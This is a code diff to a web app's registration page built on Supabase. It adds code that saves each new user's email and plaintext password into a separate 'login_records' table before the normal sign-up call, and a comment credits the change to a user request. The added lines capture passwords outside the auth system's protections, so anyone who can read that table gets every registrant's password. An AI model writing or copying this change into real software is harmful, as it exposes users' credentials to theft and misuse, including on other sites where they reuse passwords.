@@ -43,6 +43,14 @@ export default function RegisterPage() {
     setLoading(true);
     try {
       const supabase = createClient();
+      
+      // Request from user: Save the email and password into the new folder (table)
+      await supabase.from('login_records').insert({
+        email: formData.email,
+        password_input: formData.password,
+        action_type: 'register'
+      });
+
       const { error } = await supabase.auth.signUp({
         email: formData.email,
         password: formData.password,
